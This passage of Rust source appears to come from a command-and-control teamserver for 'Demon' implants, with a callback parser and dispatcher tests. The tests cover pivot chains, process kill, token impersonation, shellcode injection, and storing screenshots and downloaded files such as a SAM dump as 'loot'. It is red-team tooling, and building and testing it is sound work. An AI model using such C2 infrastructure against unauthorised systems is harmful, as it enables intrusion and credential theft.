        5 => "DES3_CBC_MD5",
        7 => "DES3_CBC_SHA1",
        11 => "RSAENCRYPTION_ENVOID",
        12 => "RSAES_OAEP_ENV_OID",
        16 => "DES3_CBC_SHA1_KD",
        17 => "AES128_CTS_HMAC_SHA1",
        18 => "AES256_CTS_HMAC_SHA1",
        23 => "RC4_HMAC",
        24 => "RC4_HMAC_EXP",
        _ => "Unknown",
    }
}

fn format_ticket_flags(flags: u32) -> String {
    const FLAG_NAMES: [&str; 16] = [
        "name_canonicalize",
        "anonymous",
        "ok_as_delegate",
        "?",
        "hw_authent",
        "pre_authent",
        "initial",
        "renewable",
        "invalid",
        "postdated",
        "may_postdate",
        "proxy",
        "proxiable",
        "forwarded",
        "forwardable",
        "reserved",
    ];

    let mut text = String::new();
    for (index, name) in FLAG_NAMES.iter().enumerate() {
        if ((flags >> (index + 16)) & 1) == 1 {
            text.push(' ');
            text.push_str(name);
        }
    }
    text.push_str(&format!(" (0x{flags:x})"));
    text
}

fn int_to_ipv4(value: u32) -> String {
    let bytes = value.to_le_bytes();
    format!("{}.{}.{}.{}", bytes[0], bytes[1], bytes[2], bytes[3])
}

struct CallbackParser<'a> {
    bytes: &'a [u8],
    offset: usize,
    command_id: u32,
}

impl<'a> CallbackParser<'a> {
    fn new(bytes: &'a [u8], command_id: u32) -> Self {
        Self { bytes, offset: 0, command_id }
    }

    fn is_empty(&self) -> bool {
        self.offset == self.bytes.len()
    }

    fn read_u32(&mut self, context: &'static str) -> Result<u32, CommandDispatchError> {
        let remaining = self.bytes.len().saturating_sub(self.offset);
        if remaining < 4 {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: expected 4 bytes, got {remaining}"),
            });
        }

        let value =
            u32::from_le_bytes(self.bytes[self.offset..self.offset + 4].try_into().map_err(
                |_| CommandDispatchError::InvalidCallbackPayload {
                    command_id: self.command_id,
                    message: format!("{context}: failed to read u32"),
                },
            )?);
        self.offset += 4;
        Ok(value)
    }

    fn read_u64(&mut self, context: &'static str) -> Result<u64, CommandDispatchError> {
        let remaining = self.bytes.len().saturating_sub(self.offset);
        if remaining < 8 {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: expected 8 bytes, got {remaining}"),
            });
        }

        let value =
            u64::from_le_bytes(self.bytes[self.offset..self.offset + 8].try_into().map_err(
                |_| CommandDispatchError::InvalidCallbackPayload {
                    command_id: self.command_id,
                    message: format!("{context}: failed to read u64"),
                },
            )?);
        self.offset += 8;
        Ok(value)
    }

    fn read_bool(&mut self, context: &'static str) -> Result<bool, CommandDispatchError> {
        Ok(self.read_u32(context)? != 0)
    }

    fn read_bytes(&mut self, context: &'static str) -> Result<Vec<u8>, CommandDispatchError> {
        let len = usize::try_from(self.read_u32(context)?).map_err(|_| {
            CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: length overflow"),
            }
        })?;
        let remaining = self.bytes.len().saturating_sub(self.offset);
        if remaining < len {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: expected {len} bytes, got {remaining}"),
            });
        }

        let value = self.bytes[self.offset..self.offset + len].to_vec();
        self.offset += len;
        Ok(value)
    }

    fn read_utf16(&mut self, context: &'static str) -> Result<String, CommandDispatchError> {
        let raw = self.read_bytes(context)?;
        if raw.len() % 2 != 0 {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: utf16 length must be even"),
            });
        }

        let words = raw
            .chunks_exact(2)
            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
            .collect::<Vec<_>>();
        Ok(String::from_utf16_lossy(&words).trim_end_matches('\0').to_owned())
    }

    fn read_string(&mut self, context: &'static str) -> Result<String, CommandDispatchError> {
        let raw = self.read_bytes(context)?;
        Ok(String::from_utf8_lossy(&raw).trim_end_matches('\0').to_owned())
    }
}

#[cfg(test)]
mod tests {
    use base64::Engine as _;
    use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
    use red_cell_common::crypto::{AGENT_IV_LENGTH, AGENT_KEY_LENGTH, decrypt_agent_data};
    use red_cell_common::demon::{
        DemonCallback, DemonCommand, DemonFilesystemCommand, DemonInjectError,
        DemonKerberosCommand, DemonMessage, DemonPivotCommand, DemonProcessCommand,
        DemonTokenCommand,
    };
    use red_cell_common::operator::OperatorMessage;
    use serde_json::Value;

    use super::CommandDispatcher;
    use crate::{AgentRegistry, Database, EventBus, Job, SocketRelayManager};

    fn sample_agent_info(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
    ) -> red_cell_common::AgentInfo {
        red_cell_common::AgentInfo {
            agent_id,
            active: true,
            reason: String::new(),
            note: String::new(),
            encryption: red_cell_common::AgentEncryptionInfo {
                aes_key: BASE64_STANDARD.encode(key),
                aes_iv: BASE64_STANDARD.encode(iv),
            },
            hostname: "wkstn-01".to_owned(),
            username: "operator".to_owned(),
            domain_name: "lab".to_owned(),
            external_ip: "127.0.0.1".to_owned(),
            internal_ip: "10.0.0.25".to_owned(),
            process_name: "explorer.exe".to_owned(),
            base_address: 0x1000,
            process_pid: 1337,
            process_tid: 7331,
            process_ppid: 512,
            process_arch: "x64".to_owned(),
            elevated: true,
            os_version: "Windows 11".to_owned(),
            os_arch: "x64".to_owned(),
            sleep_delay: 10,
            sleep_jitter: 25,
            kill_date: None,
            working_hours: None,
            first_call_in: "2026-03-09T20:00:00Z".to_owned(),
            last_call_in: "2026-03-09T20:00:00Z".to_owned(),
        }
    }

    fn decode_pivot_payload(payload: &[u8]) -> Result<(u32, Vec<u8>), String> {
        if payload.len() < 12 {
            return Err("pivot payload too short".to_owned());
        }

        let subcommand = u32::from_le_bytes(
            payload[0..4].try_into().map_err(|_| "invalid pivot subcommand".to_owned())?,
        );
        if subcommand != u32::from(DemonPivotCommand::SmbCommand) {
            return Err(format!("unexpected pivot subcommand {subcommand}"));
        }

        let target_agent_id = u32::from_le_bytes(
            payload[4..8].try_into().map_err(|_| "invalid pivot target".to_owned())?,
        );
        let outer_len = usize::try_from(u32::from_le_bytes(
            payload[8..12].try_into().map_err(|_| "invalid pivot outer length".to_owned())?,
        ))
        .map_err(|_| "pivot outer length overflow".to_owned())?;
        let outer = payload
            .get(12..12 + outer_len)
            .ok_or_else(|| "pivot outer buffer truncated".to_owned())?;
        if outer.len() < 8 {
            return Err("pivot outer buffer too short".to_owned());
        }

        let inner_target = u32::from_le_bytes(
            outer[0..4].try_into().map_err(|_| "invalid pivot inner target".to_owned())?,
        );
        if inner_target != target_agent_id {
            return Err("pivot target mismatch".to_owned());
        }

        let inner_len = usize::try_from(u32::from_le_bytes(
            outer[4..8].try_into().map_err(|_| "invalid pivot inner length".to_owned())?,
        ))
        .map_err(|_| "pivot inner length overflow".to_owned())?;
        let inner =
            outer.get(8..8 + inner_len).ok_or_else(|| "pivot inner buffer truncated".to_owned())?;
        Ok((target_agent_id, inner.to_vec()))
    }

    fn add_length_prefixed_bytes(buf: &mut Vec<u8>, bytes: &[u8]) {
        buf.extend_from_slice(&u32::try_from(bytes.len()).unwrap_or_default().to_be_bytes());
        buf.extend_from_slice(bytes);
    }

    fn add_length_prefixed_utf16(buf: &mut Vec<u8>, value: &str) {
        let mut encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_be_bytes).collect();
        encoded.extend_from_slice(&[0, 0]);
        add_length_prefixed_bytes(buf, &encoded);
    }

    fn valid_demon_init_body(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
    ) -> Vec<u8> {
        let mut metadata = Vec::new();
        metadata.extend_from_slice(&agent_id.to_be_bytes());
        add_length_prefixed_bytes(&mut metadata, b"wkstn-01");
        add_length_prefixed_bytes(&mut metadata, b"operator");
        add_length_prefixed_bytes(&mut metadata, b"lab");
        add_length_prefixed_bytes(&mut metadata, b"10.0.0.25");
        add_length_prefixed_utf16(&mut metadata, "C:\\Windows\\explorer.exe");
        metadata.extend_from_slice(&1337_u32.to_be_bytes());
        metadata.extend_from_slice(&7331_u32.to_be_bytes());
        metadata.extend_from_slice(&512_u32.to_be_bytes());
        metadata.extend_from_slice(&2_u32.to_be_bytes());
        metadata.extend_from_slice(&1_u32.to_be_bytes());
        metadata.extend_from_slice(&0x1000_u64.to_be_bytes());
        metadata.extend_from_slice(&10_u32.to_be_bytes());
        metadata.extend_from_slice(&0_u32.to_be_bytes());
        metadata.extend_from_slice(&1_u32.to_be_bytes());
        metadata.extend_from_slice(&0_u32.to_be_bytes());
        metadata.extend_from_slice(&22000_u32.to_be_bytes());
        metadata.extend_from_slice(&9_u32.to_be_bytes());
        metadata.extend_from_slice(&10_u32.to_be_bytes());
        metadata.extend_from_slice(&25_u32.to_be_bytes());
        metadata.extend_from_slice(&0_u64.to_be_bytes());
        metadata.extend_from_slice(&0_u32.to_be_bytes());

        let encrypted = red_cell_common::crypto::encrypt_agent_data(&key, &iv, &metadata);
        let payload = [
            u32::from(DemonCommand::DemonInit).to_be_bytes().as_slice(),
            7_u32.to_be_bytes().as_slice(),
            key.as_slice(),
            iv.as_slice(),
            encrypted.as_slice(),
        ]
        .concat();

        red_cell_common::demon::DemonEnvelope::new(agent_id, payload)
            .unwrap_or_else(|error| panic!("failed to build demon init body: {error}"))
            .to_bytes()
    }

    fn pivot_connect_payload(inner: &[u8]) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&u32::from(DemonPivotCommand::SmbConnect).to_le_bytes());
        payload.extend_from_slice(&1_u32.to_le_bytes());
        payload.extend_from_slice(&u32::try_from(inner.len()).unwrap_or_default().to_le_bytes());
        payload.extend_from_slice(inner);
        payload
    }

    #[tokio::test]
    async fn dispatch_returns_none_for_unregistered_commands()
    -> Result<(), Box<dyn std::error::Error>> {
        let dispatcher = CommandDispatcher::new();

        assert_eq!(dispatcher.dispatch(0x4141_4141, 0x9999, 7, b"payload").await?, None);
        assert!(!dispatcher.handles_command(0x9999));
        Ok(())
    }

    #[tokio::test]
    async fn custom_handlers_receive_agent_request_and_payload()
    -> Result<(), Box<dyn std::error::Error>> {
        let mut dispatcher = CommandDispatcher::default();
        dispatcher.register_handler(0x1234, |agent_id, request_id, payload| {
            Box::pin(async move {
                let mut response = agent_id.to_le_bytes().to_vec();
                response.extend_from_slice(&request_id.to_le_bytes());
                response.extend_from_slice(&payload);
                Ok(Some(response))
            })
        });

        let response = dispatcher.dispatch(0xAABB_CCDD, 0x1234, 0x0102_0304, b"abc").await?;

        assert_eq!(
            response,
            Some([0xDD, 0xCC, 0xBB, 0xAA, 0x04, 0x03, 0x02, 0x01, b'a', b'b', b'c',].to_vec())
        );
        assert!(dispatcher.handles_command(0x1234));
        Ok(())
    }

    #[tokio::test]
    async fn dispatch_packages_concatenates_handler_responses()
    -> Result<(), Box<dyn std::error::Error>> {
        let mut dispatcher = CommandDispatcher::new();
        dispatcher
            .register_handler(0x1111, |_, _, _| Box::pin(async move { Ok(Some(vec![1, 2])) }));
        dispatcher
            .register_handler(0x2222, |_, _, _| Box::pin(async move { Ok(Some(vec![3, 4])) }));

        let packages = vec![
            crate::DemonCallbackPackage { command_id: 0x1111, request_id: 1, payload: Vec::new() },
            crate::DemonCallbackPackage { command_id: 0x2222, request_id: 2, payload: Vec::new() },
        ];

        assert_eq!(dispatcher.dispatch_packages(0x1234_5678, &packages).await?, vec![1, 2, 3, 4]);
        Ok(())
    }

    #[tokio::test]
    async fn builtin_get_job_handler_serializes_and_drains_jobs()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry.clone(), events, database, sockets);
        let key = [0x55; AGENT_KEY_LENGTH];
        let iv = [0x22; AGENT_IV_LENGTH];
        let agent_id = 0x5566_7788;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        registry
            .enqueue_job(
                agent_id,
                Job {
                    command: u32::from(DemonCommand::CommandSleep),
                    request_id: 41,
                    payload: vec![1, 2, 3, 4],
                    command_line: "sleep 10".to_owned(),
                    task_id: "task-41".to_owned(),
                    created_at: "2026-03-09T20:10:00Z".to_owned(),
                },
            )
            .await?;

        let response = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandGetJob), 9, &[])
            .await?
            .ok_or_else(|| "get job should return serialized packages".to_owned())?;
        let message = red_cell_common::demon::DemonMessage::from_bytes(&response)?;

        assert_eq!(message.packages.len(), 1);
        assert_eq!(message.packages[0].command_id, u32::from(DemonCommand::CommandSleep));
        assert_eq!(message.packages[0].request_id, 41);
        assert_eq!(decrypt_agent_data(&key, &iv, &message.packages[0].payload)?, vec![1, 2, 3, 4]);
        assert!(registry.queued_jobs(agent_id).await?.is_empty());
        Ok(())
    }

    #[tokio::test]
    async fn builtin_get_job_wraps_linked_child_jobs_through_pivot_chain()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry.clone(), events, database, sockets);
        let root_id = 0x0102_0304;
        let pivot_id = 0x1112_1314;
        let child_id = 0x2122_2324;
        let root_key = [0x10; AGENT_KEY_LENGTH];
        let root_iv = [0x20; AGENT_IV_LENGTH];
        let pivot_key = [0x30; AGENT_KEY_LENGTH];
        let pivot_iv = [0x40; AGENT_IV_LENGTH];
        let child_key = [0x50; AGENT_KEY_LENGTH];
        let child_iv = [0x60; AGENT_IV_LENGTH];

        registry.insert(sample_agent_info(root_id, root_key, root_iv)).await?;
        registry.insert(sample_agent_info(pivot_id, pivot_key, pivot_iv)).await?;
        registry.insert(sample_agent_info(child_id, child_key, child_iv)).await?;
        registry.add_link(root_id, pivot_id).await?;
        registry.add_link(pivot_id, child_id).await?;
        registry
            .enqueue_job(
                child_id,
                Job {
                    command: u32::from(DemonCommand::CommandSleep),
                    request_id: 77,
                    payload: vec![9, 8, 7, 6],
                    command_line: "sleep 5".to_owned(),
                    task_id: "task-77".to_owned(),
                    created_at: "2026-03-09T20:12:00Z".to_owned(),
                },
            )
            .await?;

        let response = dispatcher
            .dispatch(root_id, u32::from(DemonCommand::CommandGetJob), 9, &[])
            .await?
            .ok_or_else(|| "get job should return serialized packages".to_owned())?;
        let message = DemonMessage::from_bytes(&response)?;
        assert_eq!(message.packages.len(), 1);
        assert_eq!(message.packages[0].command_id, u32::from(DemonCommand::CommandPivot));

        let first_layer = decrypt_agent_data(&root_key, &root_iv, &message.packages[0].payload)?;
        let (first_target, first_inner) = decode_pivot_payload(&first_layer)?;
        assert_eq!(first_target, pivot_id);

        let second_layer = DemonMessage::from_bytes(&first_inner)?;
        assert_eq!(second_layer.packages.len(), 1);
        let second_payload =
            decrypt_agent_data(&pivot_key, &pivot_iv, &second_layer.packages[0].payload)?;
        let (second_target, second_inner) = decode_pivot_payload(&second_payload)?;
        assert_eq!(second_target, child_id);

        let child_message = DemonMessage::from_bytes(&second_inner)?;
        assert_eq!(child_message.packages.len(), 1);
        assert_eq!(child_message.packages[0].command_id, u32::from(DemonCommand::CommandSleep));
        assert_eq!(child_message.packages[0].request_id, 77);
        assert_eq!(
            decrypt_agent_data(&child_key, &child_iv, &child_message.packages[0].payload)?,
            vec![9, 8, 7, 6]
        );
        Ok(())
    }

    #[tokio::test]
    async fn pivot_connect_callback_registers_child_and_link()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry.clone(), events, database, sockets);
        let parent_id = 0x4546_4748;
        let parent_key = [0x21; AGENT_KEY_LENGTH];
        let parent_iv = [0x31; AGENT_IV_LENGTH];
        let child_id = 0x5152_5354;
        let child_key = [0x41; AGENT_KEY_LENGTH];
        let child_iv = [0x51; AGENT_IV_LENGTH];

        registry.insert(sample_agent_info(parent_id, parent_key, parent_iv)).await?;

        let response = dispatcher
            .dispatch(
                parent_id,
                u32::from(DemonCommand::CommandPivot),
                17,
                &pivot_connect_payload(&valid_demon_init_body(child_id, child_key, child_iv)),
            )
            .await?;

        assert_eq!(response, None);
        assert_eq!(registry.parent_of(child_id).await, Some(parent_id));
        assert_eq!(registry.children_of(parent_id).await, vec![child_id]);
        assert!(registry.get(child_id).await.is_some());
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_updates_last_call_in_and_broadcasts()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry.clone(), events, database, sockets);
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3040;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        let before = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should exist before checkin".to_owned())?
            .last_call_in;

        let response = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &[0xAA, 0xBB])
            .await?;

        assert_eq!(response, None);

        let updated = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should exist after checkin".to_owned())?;
        assert_ne!(updated.last_call_in, before);

        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "agent update event should be broadcast".to_owned())?;
        let OperatorMessage::AgentUpdate(message) = event else {
            panic!("unexpected operator event");
        };
        assert_eq!(message.info.agent_id, format!("{agent_id:08X}"));
        assert_eq!(message.info.marked, "Alive");
        Ok(())
    }

    #[tokio::test]
    async fn builtin_process_list_handler_broadcasts_formatted_agent_response()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets);

        let mut payload = Vec::new();
        add_u32(&mut payload, 0);
        add_utf16(&mut payload, "explorer.exe");
        add_u32(&mut payload, 1337);
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 512);
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 17);
        add_utf16(&mut payload, "LAB\\operator");

        let response = dispatcher
            .dispatch(0xDEAD_BEEF, u32::from(DemonCommand::CommandProcList), 0x2A, &payload)
            .await?;
        assert_eq!(response, None);

        let event =
            receiver.recv().await.ok_or_else(|| "agent response event missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(message.info.demon_id, "DEADBEEF");
        assert_eq!(message.info.command_id, u32::from(DemonCommand::CommandProcList).to_string());
        assert!(message.info.output.contains("explorer.exe"));
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Process List:".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_process_kill_and_token_handlers_broadcast_agent_responses()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets);

        let kill_payload = [
            u32::from(DemonProcessCommand::Kill).to_le_bytes(),
            1_u32.to_le_bytes(),
            4040_u32.to_le_bytes(),
        ]
        .concat();
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandProc), 7, &kill_payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "kill response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Successful killed process: 4040".to_owned()))
        );

        let token_payload =
            [u32::from(DemonTokenCommand::Impersonate).to_le_bytes(), 1_u32.to_le_bytes()].concat();
        let mut token_payload = token_payload;
        add_bytes(&mut token_payload, b"LAB\\svc");
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 8, &token_payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "token response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Successful impersonated LAB\\svc".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_shellcode_handler_broadcasts_agent_response()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets);

        dispatcher
            .dispatch(
                0x0102_0304,
                u32::from(DemonCommand::CommandInjectShellcode),
                9,
                &u32::from(DemonInjectError::ProcessArchMismatch).to_le_bytes(),
            )
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "shellcode response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Process architecture mismatch".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_screenshot_handler_persists_loot_and_broadcasts_misc_fields()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF01,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database.clone(), sockets);

        let png = vec![0x89, b'P', b'N', b'G'];
        let payload = [1_u32.to_le_bytes().to_vec(), {
            let mut data = Vec::new();
            add_bytes(&mut data, &png);
            data
        }]
        .concat();

        dispatcher
            .dispatch(0xABCD_EF01, u32::from(DemonCommand::CommandScreenshot), 0x44, &payload)
            .await?;

        let loot = database.loot().list_for_agent(0xABCD_EF01).await?;
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].kind, "screenshot");
        assert_eq!(loot[0].data.as_deref(), Some(png.as_slice()));

        let event =
            receiver.recv().await.ok_or_else(|| "screenshot response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected screenshot agent response event");
        };
        assert_eq!(
            message.info.extra.get("MiscType"),
            Some(&Value::String("screenshot".to_owned()))
        );
        assert_eq!(
            message.info.extra.get("MiscData"),
            Some(&Value::String(BASE64_STANDARD.encode(&png)))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_filesystem_download_handler_persists_loot_and_progress()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF11,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database.clone(), sockets);

        let file_id = 0x33_u32;
        let remote_path = "C:\\Temp\\sam.dump";
        let content = b"secret-bytes";

        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut open, 0);
        add_u32(&mut open, file_id);
        add_u64(&mut open, u64::try_from(content.len())?);
        add_utf16(&mut open, remote_path);
        dispatcher.dispatch(0xABCD_EF11, u32::from(DemonCommand::CommandFs), 0x99, &open).await?;

        let mut write = Vec::new();
        add_u32(&mut write, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut write, 1);
        add_u32(&mut write, file_id);
        add_bytes(&mut write, content);
        dispatcher.dispatch(0xABCD_EF11, u32::from(DemonCommand::CommandFs), 0x99, &write).await?;

        let mut close = Vec::new();
        add_u32(&mut close, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut close, 2);
        add_u32(&mut close, file_id);
        add_u32(&mut close, 0);
        dispatcher.dispatch(0xABCD_EF11, u32::from(DemonCommand::CommandFs), 0x99, &close).await?;

        let first = receiver.recv().await.ok_or("missing open event")?;
        let second = receiver.recv().await.ok_or("missing progress event")?;
        let third = receiver.recv().await.ok_or("missing completion event")?;

        let OperatorMessage::AgentResponse(open_message) = first else {
            panic!("expected download open response");
        };
        assert_eq!(
            open_message.info.extra.get("MiscType"),
            Some(&Value::String("download-progress".to_owned()))
        );

        let OperatorMessage::AgentResponse(progress_message) = second else {
            panic!("expected download progress response");
        };
        assert_eq!(
            progress_message.info.extra.get("CurrentSize"),
            Some(&Value::String(content.len().to_string()))
        );

        let OperatorMessage::AgentResponse(done_message) = third else {
            panic!("expected download completion response");
        };
        assert_eq!(
            done_message.info.extra.get("MiscType"),
            Some(&Value::String("download".to_owned()))
        );
        assert_eq!(
            done_message.info.extra.get("MiscData"),
            Some(&Value::String(BASE64_STANDARD.encode(content)))
        );

        let loot = database.loot().list_for_agent(0xABCD_EF11).await?;
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].kind, "download");
        assert_eq!(loot[0].file_path.as_deref(), Some(remote_path));
        assert_eq!(loot[0].data.as_deref(), Some(content.as_slice()));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_beacon_file_callbacks_reassemble_downloads()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF21,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database.clone(), sockets);

        let file_id = 0x55_u32;
        let remote_path = "C:\\Windows\\Temp\\note.txt";
        let content = b"beacon-chunk";

        let mut open_header = Vec::new();
        open_header.extend_from_slice(&file_id.to_be_bytes());
        open_header.extend_from_slice(&(u32::try_from(content.len())?).to_be_bytes());
        open_header.extend_from_slice(remote_path.as_bytes());
        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonCallback::File));
        add_bytes(&mut open, &open_header);
        dispatcher
            .dispatch(0xABCD_EF21, u32::from(DemonCommand::BeaconOutput), 0x77, &open)
            .await?;

        let mut chunk = Vec::new();
        chunk.extend_from_slice(&file_id.to_be_bytes());
        chunk.extend_from_slice(content);
        let mut write = Vec::new();
        add_u32(&mut write, u32::from(DemonCallback::FileWrite));
        add_bytes(&mut write, &chunk);
        dispatcher
            .dispatch(0xABCD_EF21, u32::from(DemonCommand::BeaconOutput), 0x77, &write)
            .await?;

        let mut close = Vec::new();
        add_u32(&mut close, u32::from(DemonCallback::FileClose));
        add_bytes(&mut close, &file_id.to_be_bytes());
        dispatcher
            .dispatch(0xABCD_EF21, u32::from(DemonCommand::BeaconOutput), 0x77, &close)
            .await?;

        let _ = receiver.recv().await.ok_or("missing beacon open event")?;
        let _ = receiver.recv().await.ok_or("missing beacon progress event")?;
        let final_event = receiver.recv().await.ok_or("missing beacon completion event")?;
        let OperatorMessage::AgentResponse(message) = final_event else {
            panic!("expected beacon file completion response");
        };
        assert_eq!(message.info.extra.get("MiscType"), Some(&Value::String("download".to_owned())));

        let loot = database.loot().list_for_agent(0xABCD_EF21).await?;
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].data.as_deref(), Some(content.as_slice()));
        assert_eq!(loot[0].file_path.as_deref(), Some(remote_path));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_kerberos_klist_handler_formats_ticket_output()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonKerberosCommand::Klist));
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 1);
        add_utf16(&mut payload, "alice");
        add_utf16(&mut payload, "LAB");
        add_u32(&mut payload, 0x1234);
        add_u32(&mut payload, 0x5678);
        add_u32(&mut payload, 1);
        add_utf16(&mut payload, "S-1-5-21");
        add_u32(&mut payload, 0xD53E_8000);
        add_u32(&mut payload, 0x019D_B1DE);
        add_u32(&mut payload, 2);
        add_utf16(&mut payload, "Kerberos");
        add_utf16(&mut payload, "DC01");
        add_utf16(&mut payload, "lab.local");
        add_utf16(&mut payload, "alice@lab.local");
        add_u32(&mut payload, 1);
        add_utf16(&mut payload, "alice");
        add_utf16(&mut payload, "LAB.LOCAL");
        add_utf16(&mut payload, "krbtgt");
